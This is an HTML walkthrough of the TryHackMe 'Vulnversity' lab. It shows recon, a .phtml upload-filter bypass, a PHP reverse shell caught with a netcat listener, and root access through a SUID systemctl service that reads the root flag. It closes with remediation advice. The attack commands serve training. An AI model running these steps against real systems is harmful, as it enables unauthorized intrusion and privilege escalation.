@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎓 Vulnversity — Walkthrough</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/writeups/css/writeups.css">
+</head>
+<body>
+    <div class="container">
+
+        <!-- Header -->
+        <header class="room-header">
+            <div class="emoji-row">🎓🔍🐚📂🔑</div>
+            <h1>Vulnversity</h1>
+            <p class="subtitle">Learn about active recon, web app attacks and privilege escalation.</p>
+            <div class="room-meta">
+                <div class="badge">
+                    <span class="label">Room:</span> TryHackMe
+                </div>
+                <div class="badge">
+                    <span class="label">Category:</span> Web / Privesc
+                </div>
+                <div class="badge">
+                    <span class="label">Difficulty:</span> Easy
+                </div>
+                <div class="badge">
+                    <span class="label">Time:</span> 45 min
+                </div>
+            </div>
+        </header>
+
+        <!-- Attack Chain Overview -->
+        <section>
+            <h2><span class="step-num">🗺️</span> Attack Chain</h2>
+            <div class="attack-chain">
+                <div class="node">Nmap Recon</div>
+                <span class="arrow">→</span>
+                <div class="node">6 Open Ports</div>
+                <span class="arrow">→</span>
+                <div class="node">Gobuster Enum</div>
+                <span class="arrow">→</span>
+                <div class="node">/internal/ Upload Form</div>
+                <span class="arrow">→</span>
+                <div class="node">Fuzz Extensions</div>
+                <span class="arrow">→</span>
+                <div class="node">Upload .phtml Shell</div>
+                <span class="arrow">→</span>
+                <div class="node">Reverse Shell (www-data)</div>
+                <span class="arrow">→</span>
+                <div class="node">SUID Enumeration</div>
+                <span class="arrow">→</span>
+                <div class="node">systemctl SUID Exploit</div>
+                <span class="arrow">→</span>
+                <div class="node flag">🏁 Root Flag</div>
+            </div>
+        </section>
+
+        <!-- Step 1: Reconnaissance -->
+        <section>
+            <h2><span class="step-num">1</span> Reconnaissance — Nmap Scan</h2>
+
+            <p>Every attack begins with understanding the target. We start with an <strong>Nmap</strong> scan to discover open ports and running services:</p>
+
+            <div class="code-block">
+                <div class="label">Nmap — Full Port Scan with Version Detection</div>
+                <pre>nmap -sCV -p- 10.112.188.171 -T4</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.5
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
+139/tcp  open  netbios-ssn Samba smbd 4
+445/tcp  open  netbios-ssn Samba smbd 4
+3128/tcp open  http-proxy  Squid http proxy 4.10
+3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+            </div>
+
+            <div class="callout thinking">
+                <strong>💡 Understanding Nmap flags:</strong>
+                <ul>
+                    <li><code>-sV</code> — Probe ports to determine service/version info</li>
+                    <li><code>-sC</code> — Run default Nmap scripts for additional enumeration</li>
+                    <li><code>-p-</code> — Scan all 65,535 ports (not just the top 1,000)</li>
+                    <li><code>-T4</code> — Aggressive timing (faster scan, but more noise)</li>
+                </ul>
+            </div>
+
+            <p><strong>Six ports open:</strong></p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Port</th>
+                        <th>Service</th>
+                        <th>Version</th>
+                        <th>Significance</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>21</strong></td>
+                        <td>FTP</td>
+                        <td>vsftpd 3.0.5</td>
+                        <td>File Transfer Protocol — potential anonymous login</td>
+                    </tr>
+                    <tr>
+                        <td><strong>22</strong></td>
+                        <td>SSH</td>
+                        <td>OpenSSH 8.2p1</td>
+                        <td>Secure Shell — target for credential-based access</td>
+                    </tr>
+                    <tr>
+                        <td><strong>139/445</strong></td>
+                        <td>Samba</td>
+                        <td>smbd 4</td>
+                        <td>Windows file sharing on Linux — enumerate shares</td>
+                    </tr>
+                    <tr>
+                        <td><strong>3128</strong></td>
+                        <td>Squid Proxy</td>
+                        <td>4.10</td>
+                        <td>HTTP proxy — could be useful for pivoting</td>
+                    </tr>
+                    <tr>
+                        <td><strong>3333</strong></td>
+                        <td>Apache</td>
+                        <td>2.4.41</td>
+                        <td>Web server — our primary entry point</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <p>The web server on port 3333 is our main target. The operating system is <strong>Ubuntu Linux</strong> — confirmed by the SSH and Apache version strings.</p>
+        </section>
+
+        <!-- Step 2: Directory Enumeration -->
+        <section>
+            <h2><span class="step-num">2</span> Directory Enumeration — Gobuster</h2>
+
+            <p>With the web server identified, we need to discover hidden directories and files. <strong>Gobuster</strong> is a fast directory brute-forcing tool that works through a wordlist, testing each entry against the target URL:</p>
+
+            <div class="code-block">
+                <div class="label">Gobuster — Directory Brute Force</div>
+                <pre>gobuster dir -u http://10.112.188.171:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50</pre>
+            </div>
+
+            <div class="callout thinking">
+                <strong>💡 Gobuster flags explained:</strong>
+                <ul>
+                    <li><code>dir</code> — Directory/file enumeration mode</li>
+                    <li><code>-u</code> — Target URL</li>
+                    <li><code>-w</code> — Path to wordlist (dictionary of directory names to try)</li>
+                    <li><code>-t 50</code> — Use 50 concurrent threads for speed</li>
+                </ul>
+            </div>
+
+            <div class="code-block">
+                <div class="output">/images              (Status: 301)
+/css                 (Status: 301)
+/js                  (Status: 301)
+/internal            (Status: 301)</div>
+            </div>
+
+            <p>Four directories found. <code>/images</code>, <code>/css</code>, and <code>/js</code> are standard static asset folders. But <strong><code>/internal/</code></strong> stands out — it's not linked anywhere on the main site and contains an <strong>upload form</strong>.</p>
+
+            <!-- Screenshot: Upload Form -->
+            <figure>
+                <img src="images/day12_upload_form.png" alt="File upload form at /internal/" style="max-width:100%; border-radius:8px; border:1px solid var(--border); margin:1rem 0;">
+                <figcaption style="color:var(--text-secondary); font-size:0.85rem; text-align:center;">📸 The file upload form discovered at /internal/</figcaption>
+            </figure>
+        </section>
+
+        <!-- Step 3: Bypassing the Upload Filter -->
+        <section>
+            <h2><span class="step-num">3</span> Bypassing the File Upload Filter</h2>
+
+            <p>The upload form accepts files, but the server applies a filter to block dangerous file types. Since the server runs <strong>Apache on Ubuntu</strong>, our goal is to upload a <strong>PHP reverse shell</strong>. However, the <code>.php</code> extension is blocked.</p>
+
+            <p>We need to fuzz the upload to find which extensions are allowed. Using <strong>Burp Suite Intruder</strong>, we capture an upload request and test multiple PHP-related extensions:</p>
+
+            <div class="code-block">
+                <div class="label">Wordlist — PHP Extension Variants</div>
+                <pre>.php
+.php3
+.php4
+.php5
+.phtml</pre>
+            </div>
+
+            <div class="callout thinking">
+                <strong>💡 How Burp Suite Intruder works:</strong>
+                <ol>
+                    <li>Intercept the file upload request with Burp Suite Proxy</li>
+                    <li>Send the request to Intruder</li>
+                    <li>Set the attack type to <strong>Sniper</strong></li>
+                    <li>Mark the file extension as the payload position with <code>§</code> markers</li>
+                    <li>Load the extension wordlist as payloads</li>
+                    <li>Run the attack — each request tests a different extension</li>
+                    <li>Compare response lengths to find which extension was accepted</li>
+                </ol>
+            </div>
+
+            <div class="code-block">
+                <div class="output">.php      →  Blocked (extension not allowed)
+.php3     →  Blocked
+.php4     →  Blocked
+.php5     →  Blocked
+.phtml    →  ✅ ACCEPTED — Upload successful!</div>
+            </div>
+
+            <p>The <code>.phtml</code> extension is allowed. On Apache, <code>.phtml</code> files are often configured to be processed as PHP — exactly what we need.</p>
+        </section>
+
+        <!-- Step 4: Getting a Reverse Shell -->
+        <section>
+            <h2><span class="step-num">4</span> Uploading the Reverse Shell</h2>
+
+            <p>Now we prepare a <strong>PHP reverse shell</strong>. A reverse shell works by having the target machine connect back to us, giving us command-line access. Here's how it works:</p>
+
+            <ol>
+                <li>We start a <strong>listener</strong> on our AttackBox waiting for a connection</li>
+                <li>We upload the PHP shell to the target</li>
+                <li>When we visit the uploaded file in a browser, the PHP code executes</li>
+                <li>The shell connects back to our listener, giving us a terminal on the target</li>
+            </ol>
+
+            <div class="code-block">
+                <div class="label">AttackBox — Start Netcat Listener</div>
+                <pre>nc -lvnp 4321</pre>
+            </div>
+
+            <p>We use a standard PHP reverse shell, modified with our AttackBox IP and saved with the <code>.phtml</code> extension. After uploading it through the form, we navigate to the uploads directory to trigger execution:</p>
+
+            <div class="code-block">
+                <div class="label">Browser — Trigger the Shell</div>
+                <pre>http://10.112.188.171:3333/internal/uploads/shell.phtml</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">Connection received on 10.112.188.171 46184
+Linux ip-10-112-188-171 5.15.0-139-generic ... x86_64
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+            </div>
+
+            <div class="callout success">
+                <strong>✅ Shell obtained!</strong> We're connected as <code>www-data</code>, the Apache web server user. This is a low-privilege account — we need to escalate.
+            </div>
+
+            <p>Let's upgrade to a proper interactive shell:</p>
+
+            <div class="code-block">
+                <div class="label">Upgrade to Interactive PTY Shell</div>
+                <pre>python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Press Ctrl+Z
+stty raw -echo; fg
+# Press Enter</pre>
+            </div>
+        </section>
+
+        <!-- Step 5: User Flag -->
+        <section>
+            <h2><span class="step-num">5</span> User Enumeration & Flag</h2>
+
+            <p>Exploring the filesystem, we find two user home directories:</p>
+
+            <div class="code-block">
+                <div class="label">List Home Directories</div>
+                <pre>ls -la /home</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">drwxr-xr-x 4 root   root   4096 Jun 12  2025 .
+drwxr-xr-x 4 root   root   4096 Jun 12  2025 ..
+drwxr-xr-x 2 bill   bill   4096 Jul 31  2019 bill
+drwxr-xr-x 4 ubuntu ubuntu 4096 Jun 12  2025 ubuntu</div>
+            </div>
+
+            <p>Two users: <strong>bill</strong> (the webserver manager) and <strong>ubuntu</strong>. The user flag is in bill's home directory:</p>
+
+            <div class="code-block">
+                <div class="label">Read User Flag</div>
+                <pre>cat /home/bill/user.txt</pre>
+            </div>
+
+            <div class="flag-box">
+                <div class="flag-label">🏁 User Flag</div>
+                <div class="flag-value">THM{REDACTED}</div>
+            </div>
+        </section>
+
+        <!-- Step 6: SUID Explained -->
+        <section>
+            <h2><span class="step-num">6</span> Understanding SUID — The Privilege Escalation Vector</h2>
+
+            <p>Before we escalate, let's understand the vulnerability we're about to exploit.</p>
+
+            <h3>What is SUID?</h3>
+
+            <p><strong>SUID (Set owner User ID)</strong> is a special permission bit on Linux files. Normally, when you run a program, it executes with <strong>your</strong> user permissions. But if the SUID bit is set, the program runs with the permissions of the <strong>file owner</strong> instead — usually root.</p>
+
+            <p>Think of it like borrowing an ID card. You walk into a building and the security guard checks your ID — you get your access level. But if you're holding the <strong>CEO's ID card</strong> (the SUID bit), the guard treats you as the CEO and lets you go anywhere.</p>
+
+            <h3>The Classic Example: /usr/bin/passwd</h3>
+
+            <div class="code-block">
+                <div class="label">Check SUID on passwd</div>
+                <pre>ls -la /usr/bin/passwd</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">-rwsr-xr-x 1 root root 59976 Feb  6  2024 /usr/bin/passwd</div>
+            </div>
+
+            <p>Notice the <code>s</code> in <code>-rws</code> — that's the SUID bit. The file is owned by <strong>root</strong>. When a normal user runs <code>passwd</code> to change their password, the program needs to write to <code>/etc/shadow</code> — a file only root can modify. SUID temporarily elevates the user to root for that specific task only.</p>
+
+            <h3>The Danger: SUID on systemctl</h3>
+
+            <p><code>systemctl</code> is the command used to start, stop, enable, and manage system services. It should <strong>never</strong> have the SUID bit — because anyone who can run <code>systemctl</code> as root can create a malicious service that executes arbitrary commands with full root privileges.</p>
+        </section>
+
+        <!-- Step 7: Finding the SUID Binary -->
+        <section>
+            <h2><span class="step-num">7</span> Enumerating SUID Binaries</h2>
+
+            <p>We search the entire filesystem for files with the SUID bit set:</p>
+
+            <div class="code-block">
+                <div class="label">Find All SUID Binaries</div>
+                <pre>find / -perm -4000 -type f 2>/dev/null</pre>
+            </div>
+
+            <div class="callout thinking">
+                <strong>💡 Understanding the find command:</strong>
+                <ul>
+                    <li><code>/</code> — Search from the root of the filesystem</li>
+                    <li><code>-perm -4000</code> — Find files with the SUID bit set (4000 in octal)</li>
+                    <li><code>-type f</code> — Only regular files (not directories)</li>
+                    <li><code>2>/dev/null</code> — Suppress "Permission denied" errors</li>
+                </ul>
+            </div>
+
+            <div class="code-block">
+                <div class="output">/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/mount
+/bin/umount
+/bin/systemctl          ← This one is NOT normal!
+/bin/fusermount
+/sbin/mount.cifs</div>
+            </div>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Binary</th>
+                        <th>SUID Normal?</th>
+                        <th>Why</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>/bin/su</code></td>
+                        <td>✅ Yes</td>
+                        <td>Needs root to switch users</td>
+                    </tr>
+                    <tr>
+                        <td><code>/bin/mount</code></td>
+                        <td>✅ Yes</td>
+                        <td>Needs root to mount filesystems</td>
+                    </tr>
+                    <tr>
+                        <td><code>/bin/umount</code></td>
+                        <td>✅ Yes</td>
+                        <td>Needs root to unmount filesystems</td>
+                    </tr>
+                    <tr>
+                        <td><strong><code>/bin/systemctl</code></strong></td>
+                        <td><strong>❌ NO</strong></td>
+                        <td><strong>Allows any user to create root-level services — this is the vulnerability!</strong></td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="callout success">
+                <strong>🎯 The anomaly:</strong> <code>/bin/systemctl</code> does not normally have the SUID bit. This was intentionally set by the room creator as a privilege escalation path. If you can run <code>systemctl</code> as root, you can create a malicious service that executes any command with full root privileges.
+            </div>
+        </section>
+
+        <!-- Step 8: Exploiting systemctl -->
+        <section>
+            <h2><span class="step-num">8</span> Exploiting systemctl SUID for Root</h2>
+
+            <p>We exploit the SUID <code>systemctl</code> by creating a malicious systemd service. Systemd services define commands to run, and since <code>systemctl</code> runs as root, our service commands will execute as root too.</p>
+
+            <h3>Step-by-step Exploit</h3>
+
+            <p><strong>1. Create a malicious service file:</strong></p>
+            <div class="code-block">
+                <div class="label">Create Root-Privileged Service</div>
+                <pre>echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root_flag"
+[Install]
+WantedBy=multi-user.target' > /tmp/root.service</pre>
+            </div>
+
+            <p>This service does one thing: reads the root flag and copies it to a location we can access.</p>
+
+            <p><strong>2. Link and enable the service:</strong></p>
+            <div class="code-block">
+                <div class="label">Link and Start the Malicious Service</div>
+                <pre>systemctl link /tmp/root.service
+systemctl enable --now /tmp/root.service</pre>
+            </div>
+
+            <div class="callout thinking">
+                <strong>💡 What these commands do:</strong>
+                <ul>
+                    <li><code>systemctl link</code> — Makes systemd aware of our service file</li>
+                    <li><code>systemctl enable --now</code> — Enables the service to run at boot AND starts it immediately</li>
+                    <li>Because <code>systemctl</code> has the SUID bit, all of this runs as <strong>root</strong></li>
+                </ul>
+            </div>
+
+            <p><strong>3. Read the root flag:</strong></p>
+            <div class="code-block">
+                <div class="label">Read the Exfiltrated Root Flag</div>
+                <pre>cat /tmp/root_flag</pre>
+            </div>
+
+            <div class="flag-box">
+                <div class="flag-label">🏁 Root Flag</div>
+                <div class="flag-value">THM{REDACTED}</div>
+            </div>
+
+            <div class="callout success">
+                <strong>🎉 Root obtained!</strong> The malicious service executed as root, read the protected root flag, and wrote it to a world-readable location. This same technique could be used for full system compromise — reverse shells, adding users, or installing backdoors.
+            </div>
+        </section>
+
+        <!-- Summary -->
+        <section>
+            <h2><span class="step-num">📋</span> Full Kill Chain Summary</h2>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Step</th>
+                        <th>Technique</th>
+                        <th>Tool / Command</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>1</strong></td>
+                        <td>Port Scanning</td>
+                        <td>Full TCP port scan with version detection</td>
+                        <td><code>nmap -sCV -p- -T4</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>2</strong></td>
+                        <td>Directory Enumeration</td>
+                        <td>Brute-force hidden directories</td>
+                        <td><code>gobuster dir -u -w</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>3</strong></td>
+                        <td>File Upload Filter Bypass</td>
+                        <td>Fuzz allowed extensions with Burp Intruder</td>
+                        <td>Burp Suite Sniper attack</td>
+                    </tr>
+                    <tr>
+                        <td><strong>4</strong></td>
+                        <td>Reverse Shell</td>
+                        <td>Upload PHP shell with .phtml extension</td>
+                        <td>Netcat listener + PHP reverse shell</td>
+                    </tr>
+                    <tr>
+                        <td><strong>5</strong></td>
+                        <td>User Flag</td>
+                        <td>Read flag from home directory</td>
+                        <td><code>cat /home/bill/user.txt</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>6</strong></td>
+                        <td>SUID Enumeration</td>
+                        <td>Find all SUID binaries, identify anomaly</td>
+                        <td><code>find / -perm -4000</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>7</strong></td>
+                        <td>Privilege Escalation</td>
+                        <td>Create malicious systemd service via SUID systemctl</td>
+                        <td><code>systemctl link / enable --now</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>8</strong></td>
+                        <td>Root Flag</td>
+                        <td>Read flag exfiltrated by root service</td>
+                        <td><code>cat /tmp/root_flag</code></td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- Remediation -->
+        <section>
+            <h2><span class="step-num">🛡️</span> Remediation Advice</h2>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Issue</th>
+                        <th>Severity</th>
+                        <th>Fix</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Unrestricted file upload with insufficient extension filtering</strong></td>
+                        <td>Critical</td>
+                        <td>Use a strict allowlist of permitted extensions (e.g., <code>.jpg</code>, <code>.png</code> only). Validate file content, not just the extension. Store uploads outside the web root or with <code>.htaccess</code> disabling PHP execution.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>.phtml files executed as PHP</strong></td>
+                        <td>High</td>
+                        <td>Configure Apache to only execute <code>.php</code> files. Remove <code>.phtml</code> from the PHP handler configuration in <code>/etc/apache2/mods-enabled/php*.conf</code>.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>SUID bit on /bin/systemctl</strong></td>
+                        <td>Critical</td>
+                        <td>Remove the SUID bit immediately: <code>chmod -s /bin/systemctl</code>. Systemctl should never be SUID — it allows any user to create root-level services.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>User flag readable by www-data</strong></td>
+                        <td>Medium</td>
+                        <td>Set proper home directory permissions: <code>chmod 750 /home/bill</code> so only the owner and group can access it.</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>🎓 <strong>Vulnversity</strong> — TryHackMe</p>
+            <p><a href="https://tryhackme.com/room/vulnversity" target="_blank">TryHackMe Room</a> · Category: Web / Privilege Escalation · Techniques: Nmap Recon, Gobuster Directory Brute-Force, Burp Suite Intruder Fuzzing, File Upload Filter Bypass (.phtml), PHP Reverse Shell, SUID Enumeration, systemctl SUID Exploitation</p>
+        </footer>
+
+    </div>
+</body>
+</html>
